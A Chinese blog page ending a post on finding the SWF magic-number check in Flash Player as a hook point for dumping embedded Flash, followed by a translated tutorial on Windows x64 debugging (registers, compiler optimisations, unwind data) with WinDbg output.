<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/5.jpg" alt=""></p>
<p>在我的调试环境中，执行前六次go命令，还没有触发解开embedded flash的动作，所以在memory中也是找不到的。第七次执行go命令，在memory中就可以找到相应的embedded flash。经过几次尝试以后，我们可以将embedded flash的分配地址固定下来，在我这里是0x0af3f000。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/6.jpg" alt=""></p>
<p>通过硬件断点，可以方便知道哪条指令在这个地址上写了内容。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/7.jpg" alt=""></p>
<p>也可以很方便知道，哪条指令会从这里读取数据，这里，很有可能就是我们想要的点，计算偏移，去IDA里看看。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/8.jpg" alt=""></p>
<p>分析这段汇编指令以后可以知道这个函数接收两个参数，用于比较这两个string是否相等。这里，是比较ESI所指向的memory是否等于”CWS”,”FWS”或“ZWS”。配合调试器可以找到caller，然后，再到IDA中看看究竟。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/9.jpg" alt=""></p>
<p>这段汇编指令很简单，就是检查ESI所指向的memory是否是SWF的magic number，看来距离我们的目标越来越近了。继续往下分析，看看谁调用了这个函数。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/10.jpg" alt=""></p>
<p>分析相应的caller以后，可以弄明白这个函数是load flash的地方，其中，传入的参数，有一个是embedded flash的首地址，存放在ESI中，有一个是flash length，存放在EDI中。这样，我们的目标就确定了。</p>
<h2 id="在IDA中搜索text查找FWS-CWS-ZWS"><a href="#在IDA中搜索text查找FWS-CWS-ZWS" class="headerlink" title="在IDA中搜索text查找FWS,CWS,ZWS"></a>在IDA中搜索text查找FWS,CWS,ZWS</h2><p>在上面的分析过程中，我发现magic number的字符串其实是有地方存放的，只是在string window中找不到。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/11.jpg" alt=""></p>
<p>那么，有没有其他途径？可以试试在文本内容中搜索，只是速度较慢。</p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/12.jpg" alt=""></p>
<p><img src="/images/thinking-of-embedded-flash-dump-in-flash-player/13.jpg" alt=""></p>
<p>等待一段时间以后，可以看到，全文搜索以后，能符合我们需求的地方，也只有一个，而且，恰恰就在我们之前看到的check_flash_magic_number这个函数里。这种方式要比上面介绍的方式更快捷，如果不在意前面的思路，可以直接用这种方式找到相应的点。</p>
<p>当然，还有其他的hook point，如果有人找到更合适的点，可以分享出来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://michaelpdu.github.io/2016/08/31/thinking-of-embedded-flash-dump-in-flash-player/" data-id="cizl5jcjm0001mszza18hmqky" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/flash/">flash</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-x64deepdive" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/06/25/x64deepdive/" class="article-date">
  <time datetime="2015-06-25T03:35:16.000Z" itemprop="datePublished">2015-06-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/06/25/x64deepdive/">深入Windows X64调试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次完整地翻译一篇技术文章，体会颇深，自己阅读英文的技术文章觉得蛮轻松，可是，完整的翻译出来，使得语句尽量通顺、得体，再加上垒这么多文字，并非一件轻松的事。其中，有些地方个人觉得不是那么好翻译，就保留了原文的名称，望见谅。鉴于个人的翻译能力有限，文中可能出现不少语句不通、甚至错译的地方，可以及时告诉译者，方便纠正。</p>
<p>E-mail: <a href="michael_du@trendmicro.com.cn">michael_du@trendmicro.com.cn</a></p>
<p>原文链接：<a href="http://www.codemachine.com/article_x64deepdive.html" target="_blank" rel="external">http://www.codemachine.com/article_x64deepdive.html</a></p>
<p>建议各位有兴趣的话，认真阅读一下原文，个人觉得整理的还是挺好的。</p>
<p>在正式开始这篇译文之前，译者先定义下面两个关于栈帧的翻译：</p>
<ul>
<li>frame pointer：栈帧寄存器、栈帧指针，在X86平台上，是EBP所指的位置</li>
<li>stack pointer：栈顶寄存器、栈顶指针，在X86平台上，是ESP所指的位置</li>
</ul>
<p>这个教程讨论一些在X64 CPU上代码执行的要点，如：编译器优化、异常处理、参数传递和参数恢复，并且介绍这几个topic之间的关联。我们会涉及与上述topic相关的一些重要的调试命令，并且提供必要的背景知识去理解这些命令的输出。同时，也会重点介绍X64平台的调试与X86平台的不同，以及这些不同对调试的影响。最后，我们会活学活用，利用上面介绍的知识来展示如何将这些知识应用于X64平台的基于寄存器存储的参数恢复上，当然，这也是X64平台上调试的难点。</p>
<h1 id="编译器优化"><a href="#编译器优化" class="headerlink" title="编译器优化"></a>编译器优化</h1><p>这一节主要讨论影响X64 code生成的编译器优化，首先从X64寄存器开始，然后，介绍优化细节，如：函数内联处理（function in-lining）,消除尾部调用（tail call elimination）, 栈帧指针优化（frame pointer optimization）和基于栈顶指针的局部变量访问（stack pointer based local variable access）。</p>
<h2 id="寄存器的变化"><a href="#寄存器的变化" class="headerlink" title="寄存器的变化"></a>寄存器的变化</h2><p>X64平台上的所有寄存器，除了段寄存器和EFlags寄存器，都是64位的，这就意味着在x64平台上所有内存的操作都是按64位宽度进行的。同样，X64指令有能力一次性处理64位的地址和数据。增加了8个新的寄存器，如：r8~r15，与其他的使用字母命名的寄存器不同，这些寄存器都是使用数字命名。下面的调试命令输出了X64平台上寄存器的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1: kd&gt; r</div><div class="line">rax=fffffa60005f1b70 rbx=fffffa60017161b0 rcx=000000000000007f</div><div class="line">rdx=0000000000000008 rsi=fffffa60017161d0 rdi=0000000000000000</div><div class="line">rip=fffff80001ab7350 rsp=fffffa60005f1a68 rbp=fffffa60005f1c30</div><div class="line"> r8=0000000080050033  r9=00000000000006f8 r10=fffff80001b1876c</div><div class="line">r11=0000000000000000 r12=000000000000007b r13=0000000000000002</div><div class="line">r14=0000000000000006 r15=0000000000000004</div><div class="line">iopl=0         nv up ei ng nz na pe nc</div><div class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282</div><div class="line">nt!KeBugCheckEx:</div><div class="line">fffff800`01ab7350 48894c2408      mov     qword ptr [rsp+8],rcx ss:0018:fffffa60`005f1a70=000000000000007f</div></pre></td></tr></table></figure>
<p>相比较X86平台，一些寄存器的用法已经发生变化，这些变化可以按如下分组：</p>
<ol>
<li><p>非易失性寄存器是那些在函数调用过程中，值被保存起来的寄存器。X64平台拥有一个扩展的非易失性寄存器集合，在这个集合中，以前x86平台下原有的非易失性寄存器也包含在内，新增的寄存器是从R12到R15，这些寄存器对于函数参数的恢复很重要。</p>
</li>
<li><p>Fastcall寄存器用于传递函数参数。Fastcall是X64平台上默认的调用约定，前4个参数通过RCX, RDX, R8, R9传递。</p>
</li>
<li><p>RBP不再用作栈帧寄存器。现在RBP和RBX,RCX一样都是通用寄存器，调试前不再使用RBP来回溯调用栈。</p>
</li>
<li><p>在X86 CPU中，FS段寄存器用于指向线程环境块（TEB）和处理器控制区（Processor Control Region, KPCR），但是，在X64上，GS段寄存器在用户态是指向TEB，在内核态是指向KPCR。然而，当运行WOW64程序中，FS寄存器仍然指向32位的TEB。</p>
</li>
</ol>
<p>在X64平台上，trap frame的数据结构(nt!_KTRAP_FRAME)中不包含非易失性寄存器的合法内容。如果X64函数会使用到这些非易失性寄存器，那么，指令的序言部分会保存非易失性寄存器的值。这样，调试器能够一直从栈中取到这些非易失性寄存器原先的值，而不是从trap frame中去取。在X64内核模式调试状态下，<code>.trap</code>命令的输出会打印一个NOTE，用于告诉用户所有从trap frame中取出的寄存器信息可能不准确，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1: kd&gt; kv</div><div class="line">Child-SP          RetAddr           : Args to Child</div><div class="line">. </div><div class="line">. </div><div class="line">.</div><div class="line">nt!KiDoubleFaultAbort+0xb8 (TrapFrame @ fffffa60`005f1bb0)</div><div class="line">. </div><div class="line">. </div><div class="line">.</div><div class="line"></div><div class="line">1: kd&gt; .trap  fffffa60`005f1bb0</div><div class="line">NOTE: The trap frame does not contain all registers.</div><div class="line">Some register values may be zeroed or incorrect</div></pre></td></tr></table></figure>
<h2 id="函数内联处理（Function-in-lining）"><a href="#函数内联处理（Function-in-lining）" class="headerlink" title="函数内联处理（Function in-lining）"></a>函数内联处理（Function in-lining）</h2><p>如果满足一定的规则以后，X64编译器会执行内联函数的扩展，这样会将所有内联函数的调用部分用函数体来替换。内联函数的优点是避免函数调用过程中的栈帧创建以及函数退出时的栈平衡，缺点是由于指令的重复对导致可执行程序的大小增大不少，同时，也会导致cache未命中和page fault的增加。内联函数同样也会影响调试，因为当用户尝试在内联函数上设置断点时，调试器是不能找到对应的符号的。源码级别的内联可以通过编译器的/Ob flag进行控制，并且可以通过__declspec(noinline)禁止一个函数的内联过程。图1显示函数2和函数3被内联到函数1的过程。</p>
<p><img src="/images/x64deepdive/1.png" alt="Figure 1 : Function In-lining"></p>
<h2 id="消除尾部调用（Tail-Call-Elimination）"><a href="#消除尾部调用（Tail-Call-Elimination）" class="headerlink" title="消除尾部调用（Tail Call Elimination）"></a>消除尾部调用（Tail Call Elimination）</h2><p>X64编译器可以使用jump指令替换函数体内最后的call指令，通过这种方式来优化函数的调用过程。这种方法可以避免被调函数的栈帧创建，调用函数与被调函数共享相同的栈帧，并且，被调函数可以直接返回到自己爷爷级别的调用函数，这种优化在调用函数与被调函数拥有相同参数的情况下格外有用，因为如果相应的参数已经被放在指定的寄存器中，并且没有改变，那么，它们就不用被重新加载。图2显示了TCE，我们在函数1的最后调用函数4：</p>
<p><img src="/images/x64deepdive/2.png" alt="Figure 2 : Tail Call Elimination"></p>
<h2 id="栈帧指针省略（Frame-Pointer-Omission-FPO）"><a href="#栈帧指针省略（Frame-Pointer-Omission-FPO）" class="headerlink" title="栈帧指针省略（Frame Pointer Omission, FPO）"></a>栈帧指针省略（Frame Pointer Omission, FPO）</h2><p>在X86平台下，EBP寄存器用于访问栈上的参数与局部变量，而在X64平台下，RBP寄存器不再使用充当同样的作用。取而代之的是，在X64环境下，使用RSP作为栈帧寄存器和栈顶寄存器，具体是如何使用的，我们会在后续的章节中做详细的叙述。（译者注：请区分X86中的FPO与X64中的FPO，有很多相似的地方，也有不同之处。关于X86上的FPO，请参考《软件调试》中关于栈的描述）所以，在X64环境下，RBP寄存器已经不再担当栈帧寄存器，而是作为一般的通用寄存器使用。但是，有一个例外情况，当使用alloca()动态地在栈上分配空间的时候，这时，会和X86环境一样，使用RBP作为栈帧寄存器。</p>
<p>下面的汇编代码片段展示了X86环境下的KERNELBASE!Sleep函数，可以看到EBP寄存器被用作栈帧寄存器。当调用SleepEx()函数的时候，参数被压到栈上，然后，使用call指令调用SleepEx()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:009&gt; uf KERNELBASE!Sleep</div><div class="line">KERNELBASE!Sleep:</div><div class="line">75ed3511 8bff            mov     edi,edi</div><div class="line">75ed3513 55              push    ebp</div><div class="line">75ed3514 8bec            mov     ebp,esp</div><div class="line">75ed3516 6a00            push    0</div><div class="line">75ed3518 ff7508          push    dword ptr [ebp+8]</div><div class="line">75ed351b e8cbf6ffff      call    KERNELBASE!SleepEx (75ed2beb)</div><div class="line">75ed3520 5d              pop     ebp</div><div class="line">75ed3521 c20400          ret     4.</div></pre></td></tr></table></figure>
<p>下面的代码片段展示的是X64环境下相同的函数，与X86的code比起来有明显的不同。X64版本的看起来非常紧凑，主要是由于不需要保存、恢复RBP寄存器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf KERNELBASE!Sleep</div><div class="line">KERNELBASE!Sleep:</div><div class="line">000007fe`fdd21140 xor     edx,edx</div><div class="line">000007fe`fdd21142 jmp     KERNELBASE!SleepEx (000007fe`fdd21150)</div></pre></td></tr></table></figure>
<h2 id="基于栈顶指针的局部变量访问（Stack-Pointer-based-local-variable-access）"><a href="#基于栈顶指针的局部变量访问（Stack-Pointer-based-local-variable-access）" class="headerlink" title="基于栈顶指针的局部变量访问（Stack Pointer based local variable access）"></a>基于栈顶指针的局部变量访问（Stack Pointer based local variable access）</h2><p>在X86平台上，EBP的最重要作用就是可以通过EBP访问实参和局部变量，而在X64平台上，如我们前面所述，RBP寄存器不再充当栈帧寄存器的作用，所以，在X64平台上，RSP即充当栈帧寄存器(frame pointer)，又充当栈顶寄存器(stack pointer)。所以，X64上所有的引用都是基于RSP的。由于这个原因，依赖于RSP的函数，其栈帧在函数体执行过程中是固定不变的，从而可以方便访问局部变量和参数。因为PUSH和POP指令会改变栈顶指针，所以，X64函数会限制这些指令只能在函数的首尾使用。如图3所示，X64函数的结构：</p>
<p><img src="/images/x64deepdive/3.png" alt="Figure 3 : Static Stack Pointer"></p>
<p>下面的代码片段展示了函数user32!DrawTestExW的完整信息，这个函数的首部以指令“sub rsp,48h”结束，尾部以“add rsp,48h”开始。因为首尾之间的指令通过RSP访问栈上的内容，所以，没有PUSH或者POP之类的指令在函数体内。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf user32!DrawTextExW</div><div class="line">user32!DrawTextExW:</div><div class="line">00000000`779c9c64 sub     rsp,48h</div><div class="line">00000000`779c9c68 mov     rax,qword ptr [rsp+78h]</div><div class="line">00000000`779c9c6d or      dword ptr [rsp+30h],0FFFFFFFFh</div><div class="line">00000000`779c9c72 mov     qword ptr [rsp+28h],rax</div><div class="line">00000000`779c9c77 mov     eax,dword ptr [rsp+70h]</div><div class="line">00000000`779c9c7b mov     dword ptr [rsp+20h],eax</div><div class="line">00000000`779c9c7f call    user32!DrawTextExWorker (00000000`779ca944)</div><div class="line">00000000`779c9c84 add     rsp,48h</div><div class="line">00000000`779c9c88 ret</div></pre></td></tr></table></figure>
<h1 id="异常处理（Exception-Handling）"><a href="#异常处理（Exception-Handling）" class="headerlink" title="异常处理（Exception Handling）"></a>异常处理（Exception Handling）</h1><p>这一节讨论X64函数用于异常处理的底层机制和数据结构，以及调试器如何使用这些数据结构回溯调用栈的，同时，也介绍一些X64调用栈上特有的内容。</p>
<h2 id="RUNTIME-FUNCTION"><a href="#RUNTIME-FUNCTION" class="headerlink" title="RUNTIME_FUNCTION"></a>RUNTIME_FUNCTION</h2><p>X64可执行文件使用了一种PE文件格式的变种，叫做PE32+，这种文件有一个额外的段，叫做“.pdata”或者Exception Directory，用于存放处理异常的信息。这个“Exception Directory”包含一系列RUNTIME_FUNCTION 结构，每一个non-leaf函数都会有一个RUNTIME_FUNCTION，这里所谓的non-leaf函数是指那些不再调用其他函数的函数。每一个RUNTIME_FUNCTION结构包含函数第一条指令和最后一条指令的偏移，以及一个指向unwind information结构的指针。Unwind information结构用于描述在异常发生的时候，函数调用栈该如何展开。</p>
<p>图4展示了一个模块的RUNTIME_FUNCTION结构。</p>
<p><img src="/images/x64deepdive/4.png" alt="Figure 4 : RUNTIME_FUNCTION"></p>
<p>下面的汇编代码片段展示了X86平台与X64平台上异常处理的不同。在X86平台上，当高级语言使用了结构化异常处理，编译器会在函数的首尾生成特定的代码片段，用于在运行时构建异常栈帧。这些可以在下面的代码片段中看到，如：调用了ntdll!_SEH_prolog4和 ntdll!_SEH_epilog4.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0:009&gt; uf ntdll!__RtlUserThreadStart</div><div class="line">ntdll!__RtlUserThreadStart:</div><div class="line">77009d4b push    14h</div><div class="line">77009d4d push    offset ntdll! ?? ::FNODOBFM::`string&apos;+0xb5e (76ffc3d0)</div><div class="line">77009d52 call    ntdll!_SEH_prolog4 (76ffdd64)</div><div class="line">77009d57 and     dword ptr [ebp-4],0</div><div class="line">77009d5b mov     eax,dword ptr [ntdll!Kernel32ThreadInitThunkFunction (770d4224)]</div><div class="line">77009d60 push    dword ptr [ebp+0Ch]</div><div class="line">77009d63 test    eax,eax</div><div class="line">77009d65 je      ntdll!__RtlUserThreadStart+0x25 (77057075)</div><div class="line"></div><div class="line">ntdll!__RtlUserThreadStart+0x1c:</div><div class="line">77009d6b mov     edx,dword ptr [ebp+8]</div><div class="line">77009d6e xor     ecx,ecx</div><div class="line">77009d70 call    eax</div><div class="line">77009d72 mov     dword ptr [ebp-4],0FFFFFFFEh</div><div class="line">77009d79 call    ntdll!_SEH_epilog4 (76ffdda9)</div><div class="line">77009d7e ret     8</div></pre></td></tr></table></figure>
<p>然而，在X64环境上的相同函数中，没有任何迹象表明当前函数使用了结构化异常处理，因为没有运行时的异常栈帧。通过从可执行文件中提取相应的信息，可以使用RUNTIME_FUNCTION结构和RIP一起确定相应的异常处理信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf ntdll!RtlUserThreadStart</div><div class="line">Flow analysis was incomplete, some code may be missing</div><div class="line">ntdll!RtlUserThreadStart:</div><div class="line">00000000`77c03260 sub     rsp,48h</div><div class="line">00000000`77c03264 mov     r9,rcx</div><div class="line">00000000`77c03267 mov     rax,qword ptr [ntdll!Kernel32ThreadInitThunkFunction (00000000`77d08e20)]</div><div class="line">00000000`77c0326e test    rax,rax</div><div class="line">00000000`77c03271 je      ntdll!RtlUserThreadStart+0x1f (00000000`77c339c5)</div><div class="line"></div><div class="line">ntdll!RtlUserThreadStart+0x13:</div><div class="line">00000000`77c03277 mov     r8,rdx</div><div class="line">00000000`77c0327a mov     rdx,rcx</div><div class="line">00000000`77c0327d xor     ecx,ecx</div><div class="line">00000000`77c0327f call    rax</div><div class="line">00000000`77c03281 jmp     ntdll!RtlUserThreadStart+0x39 (00000000`77c03283)</div><div class="line"></div><div class="line">ntdll!RtlUserThreadStart+0x39:</div><div class="line">00000000`77c03283 add     rsp,48h</div><div class="line">00000000`77c03287 ret</div><div class="line"></div><div class="line">ntdll!RtlUserThreadStart+0x1f:</div><div class="line">00000000`77c339c5 mov     rcx,rdx</div><div class="line">00000000`77c339c8 call    r9</div><div class="line">00000000`77c339cb mov     ecx,eax</div><div class="line">00000000`77c339cd call    ntdll!RtlExitUserThread (00000000`77bf7130)</div><div class="line">00000000`77c339d2 nop</div><div class="line">00000000`77c339d3 jmp     ntdll!RtlUserThreadStart+0x2c (00000000`77c53923)</div></pre></td></tr></table></figure>
<h2 id="UNWIND-INFO和UNWIND-CODE"><a href="#UNWIND-INFO和UNWIND-CODE" class="headerlink" title="UNWIND_INFO和UNWIND_CODE"></a>UNWIND_INFO和UNWIND_CODE</h2><p>RUNTIME_FUNCTION结构的BeginAddress和EndAddress存放着虚拟地址空间上的函数首地址和尾地址所对应的偏移，这些偏移是相对于模块基址的。当函数产生异常时，OS会扫描内存中PE，寻找当前指令地址所在的RUNTIME_FUNCTION结构。UnwindData域指向另外一个结构，用于告诉OS如何去展开栈。这个UNWIND_INFO结构包含各种UNWIND_CODE结构，每一个UNWIND_CODE都代表函数首部对应的操作。</p>
<p>对于动态生成的代码，OS支持下面两个函数RtlAddFunctionTable() and RtlInstallFunctionTableCallback()，可以用于在运行过程中创建RUNTIME_FUNCTION 。</p>
<p>图5展示RUNTIME_FUNCTION和UNWIND_INFO的关系</p>
<p><img src="/images/x64deepdive/5.png" alt="Figure 5 : Unwind Information"></p>
<p>调试器命令“.fnent”可以显示指定函数的RUNTIME_FUNCTIOIN结构，下面的例子，使用”.fnent”显示ntdll!RtlUserThreadStart</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0:000&gt; .fnent ntdll!RtlUserThreadStart</div><div class="line">Debugger function entry 00000000`03be6580 for:</div><div class="line">(00000000`77c03260)   ntdll!RtlUserThreadStart   |  (00000000`77c03290)   ntdll!RtlRunOnceExecuteOnce</div><div class="line">Exact matches:</div><div class="line">    ntdll!RtlUserThreadStart = </div><div class="line"></div><div class="line">BeginAddress      = 00000000`00033260</div><div class="line">EndAddress        = 00000000`00033290</div><div class="line">UnwindInfoAddress = 00000000`00128654</div><div class="line"></div><div class="line">Unwind info at 00000000`77cf8654, 10 bytes</div><div class="line">  version 1, flags 1, prolog 4, codes 1</div><div class="line">  frame reg 0, frame offs 0</div><div class="line">  handler routine: ntdll!_C_specific_handler (00000000`77be50ac), data 3</div><div class="line">  00: offs 4, unwind op 2, op info 8	UWOP_ALLOC_SMALL</div></pre></td></tr></table></figure>
<p>如果上面的BeginAddress加上NTDLL的基址，结果是0x0000000077c03260，也就是函数RtlUserThreadStart 的首地址，如下面所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ?ntdll+00000000`00033260</div><div class="line">Evaluate expression: 2009084512 = 00000000`77c03260</div><div class="line"></div><div class="line">0:000&gt; u ntdll+00000000`00033260</div><div class="line">ntdll!RtlUserThreadStart:</div><div class="line">00000000`77c03260 sub     rsp,48h</div><div class="line">00000000`77c03264 mov     r9,rcx</div><div class="line">00000000`77c03267 mov     rax,qword ptr [ntdll!Kernel32ThreadInitThunkFunction (00000000`77d08e20)]</div><div class="line">00000000`77c0326e test    rax,rax</div><div class="line">00000000`77c03271 je      ntdll!RtlUserThreadStart+0x1f (00000000`77c339c5)</div><div class="line">00000000`77c03277 mov     r8,rdx</div><div class="line">00000000`77c0327a mov     rdx,rcx</div><div class="line">00000000`77c0327d xor     ecx,ecx</div></pre></td></tr></table></figure>
<p>如果EndAddress也用同样的方法计算，其结果指向上面函数的末尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ?ntdll+00000000`00033290</div><div class="line">Evaluate expression: 2009084560 = 00000000`77c03290</div><div class="line"></div><div class="line">0:000&gt; ub 00000000`77c03290 L10</div><div class="line">ntdll!RtlUserThreadStart+0x11:</div><div class="line">00000000`77c03271 je      ntdll!RtlUserThreadStart+0x1f (00000000`77c339c5)</div><div class="line">00000000`77c03277 mov     r8,rdx</div><div class="line">00000000`77c0327a mov     rdx,rcx</div><div class="line">00000000`77c0327d xor     ecx,ecx</div><div class="line">00000000`77c0327f call    rax</div><div class="line">00000000`77c03281 jmp     ntdll!RtlUserThreadStart+0x39 (00000000`77c03283)</div><div class="line">00000000`77c03283 add     rsp,48h</div><div class="line">00000000`77c03287 ret</div><div class="line">00000000`77c03288 nop</div><div class="line">00000000`77c03289 nop</div><div class="line">00000000`77c0328a nop</div><div class="line">00000000`77c0328b nop</div><div class="line">00000000`77c0328c nop</div><div class="line">00000000`77c0328d nop</div><div class="line">00000000`77c0328e nop</div><div class="line">00000000`77c0328f nop</div></pre></td></tr></table></figure>
<p>所以，RUNTIME_FUNCTION结构中的BeginAddress和EndAddress描述了相应的函数在memory中的位置。然而，在链接过程中的优化可能会改变上述的内容，我们会在后续的章节中介绍。</p>
<p>虽然UNWIND_INFO和UNWIND_CODE的主要目的是用于描述异常发生时，如何展开栈的。但是，调试器也可以利用这些信息，在没有symbol的时候，回溯函数调用栈。每一个UNWIND_CODE结构可以描述下面的一种操作，这些操作都会在函数首部中执行。</p>
<ul>
<li>SAVE_NONVOL – 将非易失性寄存器的值保存在栈上</li>
<li>PUSH_NONVOL – 将非易失性寄存器的值压入栈</li>
<li>ALLOC_SMALL – 在栈上分配空间，最多128 bytes</li>
<li>ALLOC_LARGE – 在栈上分配空间，最多4GB</li>
</ul>
<p>所以，本质上，UNWIND_CODE是函数首部指令所对应的元指令，或者说是伪代码。</p>
<p>图6展示了函数首部操作栈的指令与UNWIND_CODE之间的关系。UNWIND_CODE结构与它们所对应的指令呈相反的顺序，这样，在异常发生的时候，栈可以按照创建时相反的方向进行展开。</p>
<p><img src="/images/x64deepdive/6.png" alt="Figure 6 : Unwind Code"></p>
<p>下面的例子展示了X64下的notepad.exe的<code>.pdata</code>段的HEADER信息，<code>virtual address</code>域指示了.pdata段的位置是在可执行文件的0x13000的偏移处。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">T:\link -dump -headers c:\windows\system32\notepad.exe</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">SECTION HEADER #4</div><div class="line">  .pdata name</div><div class="line">     6B4 virtual size</div><div class="line">   13000 virtual address (0000000100013000 to 00000001000136B3)</div><div class="line">     800 size of raw data</div><div class="line">    F800 file pointer to raw data (0000F800 to 0000FFFF)</div><div class="line">       0 file pointer to relocation table</div><div class="line">       0 file pointer to line numbers</div><div class="line">       0 number of relocations</div><div class="line">       0 number of line numbers</div><div class="line">40000040 flags</div><div class="line">         Initialized Data</div><div class="line">         Read Only</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>下面一个例子是显示相同可执行文件的UNWIND_INFO和UNWIND_CODE，每一个UNWIND_CODE描述了一个操作，像PUSH_NONVOL或ALLOC_SMALL，这些指令是在函数首部执行的，并在栈展开时撤销的。”.fnent”命令可以显示这两个结构的内容，但是，不够详细，而”link -dump -unwindinfo”命令可以显示完整的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">T:\link -dump -unwindinfo c:\windows\system32\notepad.exe</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">  00000018 00001234 0000129F 0000EF68</div><div class="line">    Unwind version: 1</div><div class="line">    Unwind flags: None</div><div class="line">    Size of prologue: 0x12</div><div class="line">    Count of codes: 5</div><div class="line">    Unwind codes:</div><div class="line">      12: ALLOC_SMALL, size=0x28</div><div class="line">      0E: PUSH_NONVOL, register=rdi</div><div class="line">      0D: PUSH_NONVOL, register=rsi</div><div class="line">      0C: PUSH_NONVOL, register=rbp</div><div class="line">      0B: PUSH_NONVOL, register=rbx.</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
